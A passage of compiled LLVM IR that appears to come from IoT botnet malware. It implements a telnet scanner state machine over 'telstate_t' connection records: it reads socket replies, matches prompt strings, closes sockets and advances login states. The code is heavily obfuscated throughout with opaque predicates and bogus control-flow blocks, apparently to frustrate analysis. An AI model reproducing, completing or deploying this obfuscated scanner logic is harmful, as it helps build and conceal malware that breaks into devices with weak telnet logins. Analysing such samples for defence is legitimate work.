  %1251 = icmp slt i32 %1246, 10
  %1252 = or i1 %1250, %1251
  br i1 %1252, label %originalBBpart2125, label %originalBB123alteredBB

originalBBpart2125:                               ; preds = %originalBB123
  br label %1253

; <label>:1253:                                   ; preds = %originalBBpart2125, %originalBBpart2121
  %1254 = load i32, i32* %2, align 4
  %1255 = sext i32 %1254 to i64
  %1256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1255
  %1257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1256, i32 0, i32 8
  %1258 = load i8*, i8** %1257, align 8
  call void @llvm.memset.p0i8.i64(i8* %1258, i8 0, i64 1024, i32 1, i1 false)
  br label %2959

; <label>:1259:                                   ; preds = %originalBBpart2113
  %1260 = load i32, i32* @x.63
  %1261 = load i32, i32* @y.64
  %1262 = sub i32 %1260, 1
  %1263 = mul i32 %1260, %1262
  %1264 = urem i32 %1263, 2
  %1265 = icmp eq i32 %1264, 0
  %1266 = icmp slt i32 %1261, 10
  %1267 = or i1 %1265, %1266
  br i1 %1267, label %originalBB127, label %originalBB127alteredBB

originalBB127:                                    ; preds = %originalBB127alteredBB, %1259
  %1268 = load i32, i32* %2, align 4
  %1269 = sext i32 %1268 to i64
  %1270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1269
  %1271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1270, i32 0, i32 0
  %1272 = load i32, i32* %1271, align 16
  %1273 = load i32, i32* %2, align 4
  %1274 = sext i32 %1273 to i64
  %1275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1274
  %1276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1275, i32 0, i32 8
  %1277 = load i8*, i8** %1276, align 8
  %1278 = load i32, i32* %2, align 4
  %1279 = sext i32 %1278 to i64
  %1280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1279
  %1281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1280, i32 0, i32 7
  %1282 = load i16, i16* %1281, align 16
  %1283 = zext i16 %1282 to i32
  %1284 = call i32 @readUntil(i32 %1272, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1277, i32 1024, i32 %1283)
  %1285 = icmp ne i32 %1284, 0
  %1286 = load i32, i32* @x.63
  %1287 = load i32, i32* @y.64
  %1288 = sub i32 %1286, 1
  %1289 = mul i32 %1286, %1288
  %1290 = urem i32 %1289, 2
  %1291 = icmp eq i32 %1290, 0
  %1292 = icmp slt i32 %1287, 10
  %1293 = or i1 %1291, %1292
  br i1 %1293, label %originalBBpart2129, label %originalBB127alteredBB

originalBBpart2129:                               ; preds = %originalBB127
  br i1 %1285, label %1294, label %1342

; <label>:1294:                                   ; preds = %originalBBpart2129
  %1295 = load i32, i32* %2, align 4
  %1296 = sext i32 %1295 to i64
  %1297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1296
  %1298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1297, i32 0, i32 6
  store i32 0, i32* %1298, align 4
  %1299 = load i32, i32* %2, align 4
  %1300 = sext i32 %1299 to i64
  %1301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1300
  %1302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1301, i32 0, i32 7
  store i16 0, i16* %1302, align 16
  %1303 = load i32, i32* %2, align 4
  %1304 = sext i32 %1303 to i64
  %1305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1304
  %1306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1305, i32 0, i32 8
  %1307 = load i8*, i8** %1306, align 8
  %1308 = call i8* @strstr(i8* %1307, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0)) #10
  %1309 = icmp ne i8* %1308, null
  br i1 %1309, label %1310, label %1315

; <label>:1310:                                   ; preds = %1294
  %1311 = load i32, i32* %2, align 4
  %1312 = sext i32 %1311 to i64
  %1313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1312
  %1314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1313, i32 0, i32 2
  store i8 5, i8* %1314, align 8
  br label %1336

; <label>:1315:                                   ; preds = %1294
  %1316 = load i32, i32* @x.63
  %1317 = load i32, i32* @y.64
  %1318 = sub i32 %1316, 1
  %1319 = mul i32 %1316, %1318
  %1320 = urem i32 %1319, 2
  %1321 = icmp eq i32 %1320, 0
  %1322 = icmp slt i32 %1317, 10
  %1323 = or i1 %1321, %1322
  br i1 %1323, label %originalBB131, label %originalBB131alteredBB

originalBB131:                                    ; preds = %originalBB131alteredBB, %1315
  %1324 = load i32, i32* %2, align 4
  %1325 = sext i32 %1324 to i64
  %1326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1325
  %1327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1326, i32 0, i32 2
  store i8 7, i8* %1327, align 8
  %1328 = load i32, i32* @x.63
  %1329 = load i32, i32* @y.64
  %1330 = sub i32 %1328, 1
  %1331 = mul i32 %1328, %1330
  %1332 = urem i32 %1331, 2
  %1333 = icmp eq i32 %1332, 0
  %1334 = icmp slt i32 %1329, 10
  %1335 = or i1 %1333, %1334
  br i1 %1335, label %originalBBpart2133, label %originalBB131alteredBB

originalBBpart2133:                               ; preds = %originalBB131
  br label %1336

; <label>:1336:                                   ; preds = %originalBBpart2133, %1310
  %1337 = load i32, i32* %2, align 4
  %1338 = sext i32 %1337 to i64
  %1339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1338
  %1340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1339, i32 0, i32 8
  %1341 = load i8*, i8** %1340, align 8
  call void @llvm.memset.p0i8.i64(i8* %1341, i8 0, i64 1024, i32 1, i1 false)
  br label %2959

; <label>:1342:                                   ; preds = %originalBBpart2129
  %1343 = load i32, i32* %2, align 4
  %1344 = sext i32 %1343 to i64
  %1345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1344
  %1346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1345, i32 0, i32 8
  %1347 = load i8*, i8** %1346, align 8
  %1348 = call i8* @strstr(i8* %1347, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #10
  %1349 = icmp ne i8* %1348, null
  br i1 %1349, label %1350, label %1365

; <label>:1350:                                   ; preds = %1342
  %1351 = load i32, i32* %2, align 4
  %1352 = sext i32 %1351 to i64
  %1353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1352
  %1354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1353, i32 0, i32 0
  %1355 = load i32, i32* %1354, align 16
  %1356 = call i32 @sclose(i32 %1355)
  %1357 = load i32, i32* %2, align 4
  %1358 = sext i32 %1357 to i64
  %1359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1358
  %1360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1359, i32 0, i32 2
  store i8 0, i8* %1360, align 8
  %1361 = load i32, i32* %2, align 4
  %1362 = sext i32 %1361 to i64
  %1363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1362
  %1364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1363, i32 0, i32 3
  store i8 0, i8* %1364, align 1
  br label %2959

; <label>:1365:                                   ; preds = %1342
  %1366 = load i32, i32* %2, align 4
  %1367 = sext i32 %1366 to i64
  %1368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1367
  %1369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1368, i32 0, i32 8
  %1370 = load i8*, i8** %1369, align 8
  %1371 = call i8* @strstr(i8* %1370, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0)) #10
  %1372 = icmp ne i8* %1371, null
  br i1 %1372, label %1373, label %1388

; <label>:1373:                                   ; preds = %1365
  %1374 = load i32, i32* %2, align 4
  %1375 = sext i32 %1374 to i64
  %1376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1375
  %1377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1376, i32 0, i32 0
  %1378 = load i32, i32* %1377, align 16
  %1379 = call i32 @sclose(i32 %1378)
  %1380 = load i32, i32* %2, align 4
  %1381 = sext i32 %1380 to i64
  %1382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1381
  %1383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1382, i32 0, i32 2
  store i8 0, i8* %1383, align 8
  %1384 = load i32, i32* %2, align 4
  %1385 = sext i32 %1384 to i64
  %1386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1385
  %1387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1386, i32 0, i32 3
  store i8 0, i8* %1387, align 1
  br label %2959

; <label>:1388:                                   ; preds = %1365
  %1389 = load i32, i32* @x.63
  %1390 = load i32, i32* @y.64
  %1391 = sub i32 %1389, 1
  %1392 = mul i32 %1389, %1391
  %1393 = urem i32 %1392, 2
  %1394 = icmp eq i32 %1393, 0
  %1395 = icmp slt i32 %1390, 10
  %1396 = or i1 %1394, %1395
  br i1 %1396, label %originalBB135, label %originalBB135alteredBB

originalBB135:                                    ; preds = %originalBB135alteredBB, %1388
  %1397 = load i32, i32* %2, align 4
  %1398 = sext i32 %1397 to i64
  %1399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1398
  %1400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1399, i32 0, i32 8
  %1401 = load i8*, i8** %1400, align 8
  %1402 = call i8* @strstr(i8* %1401, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0)) #10
  %1403 = icmp ne i8* %1402, null
  %1404 = load i32, i32* @x.63
  %1405 = load i32, i32* @y.64
  %1406 = sub i32 %1404, 1
  %1407 = mul i32 %1404, %1406
  %1408 = urem i32 %1407, 2
  %1409 = icmp eq i32 %1408, 0
  %1410 = icmp slt i32 %1405, 10
  %1411 = or i1 %1409, %1410
  br i1 %1411, label %originalBBpart2137, label %originalBB135alteredBB

originalBBpart2137:                               ; preds = %originalBB135
  br i1 %1403, label %1412, label %1443

; <label>:1412:                                   ; preds = %originalBBpart2137
  %1413 = load i32, i32* @x.63
  %1414 = load i32, i32* @y.64
  %1415 = sub i32 %1413, 1
  %1416 = mul i32 %1413, %1415
  %1417 = urem i32 %1416, 2
  %1418 = icmp eq i32 %1417, 0
  %1419 = icmp slt i32 %1414, 10
  %1420 = or i1 %1418, %1419
  br i1 %1420, label %originalBB139, label %originalBB139alteredBB

originalBB139:                                    ; preds = %originalBB139alteredBB, %1412
  %1421 = load i32, i32* %2, align 4
  %1422 = sext i32 %1421 to i64
  %1423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1422
  %1424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1423, i32 0, i32 0
  %1425 = load i32, i32* %1424, align 16
  %1426 = call i32 @sclose(i32 %1425)
  %1427 = load i32, i32* %2, align 4
  %1428 = sext i32 %1427 to i64
  %1429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1428
  %1430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1429, i32 0, i32 2
  store i8 0, i8* %1430, align 8
  %1431 = load i32, i32* %2, align 4
  %1432 = sext i32 %1431 to i64
  %1433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1432
  %1434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1433, i32 0, i32 3
  store i8 0, i8* %1434, align 1
  %1435 = load i32, i32* @x.63
  %1436 = load i32, i32* @y.64
  %1437 = sub i32 %1435, 1
  %1438 = mul i32 %1435, %1437
  %1439 = urem i32 %1438, 2
  %1440 = icmp eq i32 %1439, 0
  %1441 = icmp slt i32 %1436, 10
  %1442 = or i1 %1440, %1441
  br i1 %1442, label %originalBBpart2141, label %originalBB139alteredBB

originalBBpart2141:                               ; preds = %originalBB139
  br label %2959

; <label>:1443:                                   ; preds = %originalBBpart2137
  %1444 = load i32, i32* @x.63
  %1445 = load i32, i32* @y.64
  %1446 = sub i32 %1444, 1
  %1447 = mul i32 %1444, %1446
  %1448 = urem i32 %1447, 2
  %1449 = icmp eq i32 %1448, 0
  %1450 = icmp slt i32 %1445, 10
  %1451 = or i1 %1449, %1450
  br i1 %1451, label %originalBB143, label %originalBB143alteredBB

originalBB143:                                    ; preds = %originalBB143alteredBB, %1443
  %1452 = load i32, i32* %2, align 4
  %1453 = sext i32 %1452 to i64
  %1454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1453
  %1455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1454, i32 0, i32 8
  %1456 = load i8*, i8** %1455, align 8
  %1457 = call i8* @strstr(i8* %1456, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %1458 = icmp ne i8* %1457, null
  %1459 = load i32, i32* @x.63
  %1460 = load i32, i32* @y.64
  %1461 = sub i32 %1459, 1
  %1462 = mul i32 %1459, %1461
  %1463 = urem i32 %1462, 2
  %1464 = icmp eq i32 %1463, 0
  %1465 = icmp slt i32 %1460, 10
  %1466 = or i1 %1464, %1465
  br i1 %1466, label %originalBBpart2145, label %originalBB143alteredBB

originalBBpart2145:                               ; preds = %originalBB143
  br i1 %1458, label %1467, label %1482

; <label>:1467:                                   ; preds = %originalBBpart2145
  %1468 = load i32, i32* %2, align 4
  %1469 = sext i32 %1468 to i64
  %1470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1469
  %1471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1470, i32 0, i32 0
  %1472 = load i32, i32* %1471, align 16
  %1473 = call i32 @sclose(i32 %1472)
  %1474 = load i32, i32* %2, align 4
  %1475 = sext i32 %1474 to i64
  %1476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1475
  %1477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1476, i32 0, i32 2
  store i8 0, i8* %1477, align 8
  %1478 = load i32, i32* %2, align 4
  %1479 = sext i32 %1478 to i64
  %1480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1479
  %1481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1480, i32 0, i32 3
  store i8 0, i8* %1481, align 1
  br label %2959

; <label>:1482:                                   ; preds = %originalBBpart2145
  %1483 = load i32, i32* %2, align 4
  %1484 = sext i32 %1483 to i64
  %1485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1484
  %1486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1485, i32 0, i32 8
  %1487 = load i8*, i8** %1486, align 8
  %1488 = call i8* @strstr(i8* %1487, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0)) #10
  %1489 = icmp ne i8* %1488, null
  br i1 %1489, label %1490, label %1505

; <label>:1490:                                   ; preds = %1482
  %1491 = load i32, i32* %2, align 4
  %1492 = sext i32 %1491 to i64
  %1493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1492
  %1494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1493, i32 0, i32 0
  %1495 = load i32, i32* %1494, align 16
  %1496 = call i32 @sclose(i32 %1495)
  %1497 = load i32, i32* %2, align 4
  %1498 = sext i32 %1497 to i64
  %1499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1498
  %1500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1499, i32 0, i32 2
  store i8 0, i8* %1500, align 8
  %1501 = load i32, i32* %2, align 4
  %1502 = sext i32 %1501 to i64
  %1503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1502
  %1504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1503, i32 0, i32 3
  store i8 0, i8* %1504, align 1
  br label %2959

; <label>:1505:                                   ; preds = %1482
  %1506 = load i32, i32* %2, align 4
  %1507 = sext i32 %1506 to i64
  %1508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1507
  %1509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1508, i32 0, i32 8
  %1510 = load i8*, i8** %1509, align 8
  %1511 = call i8* @strstr(i8* %1510, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0)) #10
  %1512 = icmp ne i8* %1511, null
  br i1 %1512, label %1513, label %1544

; <label>:1513:                                   ; preds = %1505
  %1514 = load i32, i32* @x.63
  %1515 = load i32, i32* @y.64
  %1516 = sub i32 %1514, 1
  %1517 = mul i32 %1514, %1516
  %1518 = urem i32 %1517, 2
  %1519 = icmp eq i32 %1518, 0
  %1520 = icmp slt i32 %1515, 10
  %1521 = or i1 %1519, %1520
  br i1 %1521, label %originalBB147, label %originalBB147alteredBB

originalBB147:                                    ; preds = %originalBB147alteredBB, %1513
  %1522 = load i32, i32* %2, align 4
  %1523 = sext i32 %1522 to i64
  %1524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1523
  %1525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1524, i32 0, i32 0
  %1526 = load i32, i32* %1525, align 16
  %1527 = call i32 @sclose(i32 %1526)
  %1528 = load i32, i32* %2, align 4
  %1529 = sext i32 %1528 to i64
  %1530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1529
  %1531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1530, i32 0, i32 2
  store i8 0, i8* %1531, align 8
  %1532 = load i32, i32* %2, align 4
  %1533 = sext i32 %1532 to i64
  %1534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1533
  %1535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1534, i32 0, i32 3
  store i8 0, i8* %1535, align 1
  %1536 = load i32, i32* @x.63
  %1537 = load i32, i32* @y.64
  %1538 = sub i32 %1536, 1
  %1539 = mul i32 %1536, %1538
  %1540 = urem i32 %1539, 2
  %1541 = icmp eq i32 %1540, 0
  %1542 = icmp slt i32 %1537, 10
  %1543 = or i1 %1541, %1542
  br i1 %1543, label %originalBBpart2149, label %originalBB147alteredBB

originalBBpart2149:                               ; preds = %originalBB147
  br label %2959

; <label>:1544:                                   ; preds = %1505
  %1545 = load i32, i32* %2, align 4
  %1546 = sext i32 %1545 to i64
  %1547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1546
  %1548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1547, i32 0, i32 8
  %1549 = load i8*, i8** %1548, align 8
  %1550 = call i8* @strstr(i8* %1549, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0)) #10
  %1551 = icmp ne i8* %1550, null
  br i1 %1551, label %1552, label %1567

; <label>:1552:                                   ; preds = %1544
  %1553 = load i32, i32* %2, align 4
  %1554 = sext i32 %1553 to i64
  %1555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1554
  %1556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1555, i32 0, i32 0
  %1557 = load i32, i32* %1556, align 16
  %1558 = call i32 @sclose(i32 %1557)
  %1559 = load i32, i32* %2, align 4
  %1560 = sext i32 %1559 to i64
  %1561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1560
  %1562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1561, i32 0, i32 2
  store i8 0, i8* %1562, align 8
  %1563 = load i32, i32* %2, align 4
  %1564 = sext i32 %1563 to i64
  %1565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1564
  %1566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1565, i32 0, i32 3
  store i8 0, i8* %1566, align 1
  br label %2959

; <label>:1567:                                   ; preds = %1544
  %1568 = load i32, i32* %2, align 4
  %1569 = sext i32 %1568 to i64
  %1570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1569
  %1571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1570, i32 0, i32 8
  %1572 = load i8*, i8** %1571, align 8
  %1573 = call i8* @strstr(i8* %1572, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %1574 = icmp ne i8* %1573, null
  br i1 %1574, label %1575, label %1606

; <label>:1575:                                   ; preds = %1567
  %1576 = load i32, i32* @x.63
  %1577 = load i32, i32* @y.64
  %1578 = sub i32 %1576, 1
  %1579 = mul i32 %1576, %1578
  %1580 = urem i32 %1579, 2
  %1581 = icmp eq i32 %1580, 0
  %1582 = icmp slt i32 %1577, 10
  %1583 = or i1 %1581, %1582
  br i1 %1583, label %originalBB151, label %originalBB151alteredBB

originalBB151:                                    ; preds = %originalBB151alteredBB, %1575
  %1584 = load i32, i32* %2, align 4
  %1585 = sext i32 %1584 to i64
  %1586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1585
  %1587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1586, i32 0, i32 0
  %1588 = load i32, i32* %1587, align 16
  %1589 = call i32 @sclose(i32 %1588)
  %1590 = load i32, i32* %2, align 4
  %1591 = sext i32 %1590 to i64
  %1592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1591
  %1593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1592, i32 0, i32 2
  store i8 0, i8* %1593, align 8
  %1594 = load i32, i32* %2, align 4
  %1595 = sext i32 %1594 to i64
  %1596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1595
  %1597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1596, i32 0, i32 3
  store i8 0, i8* %1597, align 1
  %1598 = load i32, i32* @x.63
  %1599 = load i32, i32* @y.64
  %1600 = sub i32 %1598, 1
  %1601 = mul i32 %1598, %1600
  %1602 = urem i32 %1601, 2
  %1603 = icmp eq i32 %1602, 0
  %1604 = icmp slt i32 %1599, 10
  %1605 = or i1 %1603, %1604
  br i1 %1605, label %originalBBpart2153, label %originalBB151alteredBB

originalBBpart2153:                               ; preds = %originalBB151
  br label %2959

; <label>:1606:                                   ; preds = %1567
  br label %1607

; <label>:1607:                                   ; preds = %1606
  br label %1608

; <label>:1608:                                   ; preds = %1607
  br label %1609

; <label>:1609:                                   ; preds = %1608
  br label %1610

; <label>:1610:                                   ; preds = %1609
  %1611 = load i32, i32* @x.63
  %1612 = load i32, i32* @y.64
  %1613 = sub i32 %1611, 1
  %1614 = mul i32 %1611, %1613
  %1615 = urem i32 %1614, 2
  %1616 = icmp eq i32 %1615, 0
  %1617 = icmp slt i32 %1612, 10
  %1618 = or i1 %1616, %1617
  br i1 %1618, label %originalBB155, label %originalBB155alteredBB

originalBB155:                                    ; preds = %originalBB155alteredBB, %1610
  %1619 = load i32, i32* @x.63
  %1620 = load i32, i32* @y.64
  %1621 = sub i32 %1619, 1
  %1622 = mul i32 %1619, %1621
  %1623 = urem i32 %1622, 2
  %1624 = icmp eq i32 %1623, 0
  %1625 = icmp slt i32 %1620, 10
  %1626 = or i1 %1624, %1625
  br i1 %1626, label %originalBBpart2157, label %originalBB155alteredBB

originalBBpart2157:                               ; preds = %originalBB155
  br label %1627

; <label>:1627:                                   ; preds = %originalBBpart2157
  %1628 = load i32, i32* @x.63
  %1629 = load i32, i32* @y.64
  %1630 = sub i32 %1628, 1
  %1631 = mul i32 %1628, %1630
  %1632 = urem i32 %1631, 2
  %1633 = icmp eq i32 %1632, 0
  %1634 = icmp slt i32 %1629, 10
  %1635 = or i1 %1633, %1634
  br i1 %1635, label %originalBB159, label %originalBB159alteredBB

originalBB159:                                    ; preds = %originalBB159alteredBB, %1627
  %1636 = load i32, i32* @x.63
  %1637 = load i32, i32* @y.64
  %1638 = sub i32 %1636, 1
  %1639 = mul i32 %1636, %1638
  %1640 = urem i32 %1639, 2
  %1641 = icmp eq i32 %1640, 0
  %1642 = icmp slt i32 %1637, 10
  %1643 = or i1 %1641, %1642
  br i1 %1643, label %originalBBpart2161, label %originalBB159alteredBB

originalBBpart2161:                               ; preds = %originalBB159
  br label %1644

; <label>:1644:                                   ; preds = %originalBBpart2161
  br label %1645

; <label>:1645:                                   ; preds = %1644
  %1646 = load i32, i32* @x.63
  %1647 = load i32, i32* @y.64
  %1648 = sub i32 %1646, 1
  %1649 = mul i32 %1646, %1648
  %1650 = urem i32 %1649, 2
  %1651 = icmp eq i32 %1650, 0
  %1652 = icmp slt i32 %1647, 10
  %1653 = or i1 %1651, %1652
  br i1 %1653, label %originalBB163, label %originalBB163alteredBB

originalBB163:                                    ; preds = %originalBB163alteredBB, %1645
  %1654 = load i32, i32* %2, align 4
  %1655 = sext i32 %1654 to i64
  %1656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1655
  %1657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1656, i32 0, i32 8
  %1658 = load i8*, i8** %1657, align 8
  %1659 = call i64 @strlen(i8* %1658) #10
  %1660 = trunc i64 %1659 to i16
  %1661 = load i32, i32* %2, align 4
  %1662 = sext i32 %1661 to i64
  %1663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1662
  %1664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1663, i32 0, i32 7
  store i16 %1660, i16* %1664, align 16
  %1665 = load i32, i32* @x.63
  %1666 = load i32, i32* @y.64
  %1667 = sub i32 %1665, 1
  %1668 = mul i32 %1665, %1667
  %1669 = urem i32 %1668, 2
  %1670 = icmp eq i32 %1669, 0
  %1671 = icmp slt i32 %1666, 10
  %1672 = or i1 %1670, %1671
  br i1 %1672, label %originalBBpart2165, label %originalBB163alteredBB

originalBBpart2165:                               ; preds = %originalBB163
  br label %1673

; <label>:1673:                                   ; preds = %originalBBpart2165
  %1674 = load i32, i32* @x.63
  %1675 = load i32, i32* @y.64
  %1676 = sub i32 %1674, 1
  %1677 = mul i32 %1674, %1676
  %1678 = urem i32 %1677, 2
  %1679 = icmp eq i32 %1678, 0
  %1680 = icmp slt i32 %1675, 10
  %1681 = or i1 %1679, %1680
  br i1 %1681, label %originalBB167, label %originalBB167alteredBB

originalBB167:                                    ; preds = %originalBB167alteredBB, %1673
  %1682 = load i32, i32* @x.63
  %1683 = load i32, i32* @y.64
  %1684 = sub i32 %1682, 1
  %1685 = mul i32 %1682, %1684
  %1686 = urem i32 %1685, 2
  %1687 = icmp eq i32 %1686, 0
  %1688 = icmp slt i32 %1683, 10
  %1689 = or i1 %1687, %1688
  br i1 %1689, label %originalBBpart2169, label %originalBB167alteredBB

originalBBpart2169:                               ; preds = %originalBB167
  br label %1690

; <label>:1690:                                   ; preds = %originalBBpart2169
  %1691 = load i32, i32* @x.63
  %1692 = load i32, i32* @y.64
  %1693 = sub i32 %1691, 1
  %1694 = mul i32 %1691, %1693
  %1695 = urem i32 %1694, 2
  %1696 = icmp eq i32 %1695, 0
  %1697 = icmp slt i32 %1692, 10
  %1698 = or i1 %1696, %1697
  br i1 %1698, label %originalBB171, label %originalBB171alteredBB

originalBB171:                                    ; preds = %originalBB171alteredBB, %1690
  %1699 = load i32, i32* %2, align 4
  %1700 = sext i32 %1699 to i64
  %1701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1700
  %1702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1701, i32 0, i32 6
  %1703 = load i32, i32* %1702, align 4
  %1704 = add i32 %1703, 10
  %1705 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1706 = icmp ult i32 %1704, %1705
  %1707 = load i32, i32* @x.63
  %1708 = load i32, i32* @y.64
  %1709 = sub i32 %1707, 1
  %1710 = mul i32 %1707, %1709
  %1711 = urem i32 %1710, 2
  %1712 = icmp eq i32 %1711, 0
  %1713 = icmp slt i32 %1708, 10
  %1714 = or i1 %1712, %1713
  br i1 %1714, label %originalBBpart2182, label %originalBB171alteredBB

originalBBpart2182:                               ; preds = %originalBB171
  br i1 %1706, label %1715, label %1730

; <label>:1715:                                   ; preds = %originalBBpart2182
  %1716 = load i32, i32* %2, align 4
  %1717 = sext i32 %1716 to i64
  %1718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1717
  %1719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1718, i32 0, i32 0
  %1720 = load i32, i32* %1719, align 16
  %1721 = call i32 @sclose(i32 %1720)
  %1722 = load i32, i32* %2, align 4
  %1723 = sext i32 %1722 to i64
  %1724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1723
  %1725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1724, i32 0, i32 2
  store i8 0, i8* %1725, align 8
  %1726 = load i32, i32* %2, align 4
  %1727 = sext i32 %1726 to i64
  %1728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1727
  %1729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1728, i32 0, i32 3
  store i8 1, i8* %1729, align 1
  br label %1730

